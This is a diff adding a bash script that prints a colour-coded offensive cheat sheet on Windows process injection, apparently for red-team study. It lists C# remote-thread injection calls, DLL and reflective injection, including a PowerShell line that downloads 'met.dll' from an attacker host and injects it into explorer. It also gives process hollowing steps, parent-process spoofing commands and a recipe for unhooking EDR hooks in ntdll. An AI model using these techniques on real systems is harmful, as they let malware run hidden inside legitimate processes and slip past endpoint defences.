@@ -1,0 +1,71 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PROCESS INJECTION ────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Classic Remote Injection (C#) ────────────────────${NC}"
+echo -e "  ${GREEN}int pid = int.Parse(args[0]);${NC}"
+echo -e "  ${GREEN}IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);${NC}"
+echo -e "  ${GREEN}IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);${NC}"
+echo -e "  ${GREEN}WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);${NC}"
+echo -e "  ${GREEN}CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── DLL Injection via LoadLibraryA (C#) ──────────────${NC}"
+echo -e "  ${GREEN}IntPtr hKernel32 = GetModuleHandle(\"kernel32.dll\");${NC}"
+echo -e "  ${GREEN}IntPtr loadLib = GetProcAddress(hKernel32, \"LoadLibraryA\");${NC}"
+echo -e "  Note: Write DLL path to remote process, then CreateRemoteThread with loadLib"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Reflective DLL Injection (PowerShell) ────────────${NC}"
+echo -e "  ${GREEN}\$bytes = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/met.dll')${NC}"
+echo -e "  ${GREEN}\$procid = (Get-Process -Name explorer).Id${NC}"
+echo -e "  ${GREEN}Import-Module .\\Invoke-ReflectivePEInjection.ps1${NC}"
+echo -e "  ${GREEN}Invoke-ReflectivePEInjection -PEBytes \$bytes -ProcId \$procid${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Process Hollowing (C#) ───────────────────────────${NC}"
+echo -e "  ${GREEN}// 1. CreateProcessW svchost.exe suspended (0x4)${NC}"
+echo -e "  ${GREEN}// 2. Get PEB, read ImageBase at PEB+0x10${NC}"
+echo -e "  ${GREEN}// 3. Parse payload PE headers${NC}"
+echo -e "  ${GREEN}// 4. WriteProcessMemory payload at EntryPoint${NC}"
+echo -e "  ${GREEN}// 5. ResumeThread${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PPID Spoofing ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}SelectMyParent.exe cmd.exe <parent_PID>${NC}        # spoof parent"
+echo -e "  ${GREEN}SelectMyParent.exe powershell.exe <explorer_PID>${NC}  # look like explorer"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Technique Reference ──────────────────────────────${NC}"
+echo -e "  ${BLUE}Classic Remote${NC}      OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread"
+echo -e "  ${BLUE}DLL Injection${NC}       LoadLibraryA via CreateRemoteThread"
+echo -e "  ${BLUE}Reflective DLL${NC}      Invoke-ReflectivePEInjection (no disk write)"
+echo -e "  ${BLUE}Process Hollowing${NC}   CreateProcess suspended -> overwrite PE -> ResumeThread"
+echo -e "  ${BLUE}Thread Hijacking${NC}    SuspendThread -> write RIP/EIP -> ResumeThread"
+echo -e "  ${BLUE}Early Bird APC${NC}      CreateProcess(SUSPENDED) -> QueueUserAPC -> ResumeThread"
+echo -e "  ${BLUE}NtCreateSection${NC}     NtCreateSection -> NtMapViewOfSection (shared memory)"
+echo -e "  ${BLUE}Process Doppelganging${NC}  NTFS transactions -> create process -> rollback"
+echo -e "  ${BLUE}Module Stomping${NC}     Overwrite loaded DLL .text section (no new allocs)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── EDR API Unhooking ────────────────────────────────${NC}"
+echo -e "  ${GREEN}// 1. Open C:\\Windows\\System32\\ntdll.dll from disk (clean copy)${NC}"
+echo -e "  ${GREEN}// 2. Map into memory${NC}"
+echo -e "  ${GREEN}// 3. Copy clean .text section over hooked in-memory version${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Rust Injection ───────────────────────────────────${NC}"
+echo -e "  ${GREEN}// OpenProcess -> VirtualAllocEx(PAGE_EXECUTE_READWRITE) -> WriteProcessMemory -> CreateRemoteThread${NC}"
+echo -e "  ${GREEN}// W^X pattern: alloc RW -> write -> VirtualProtect RX -> CreateThread${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
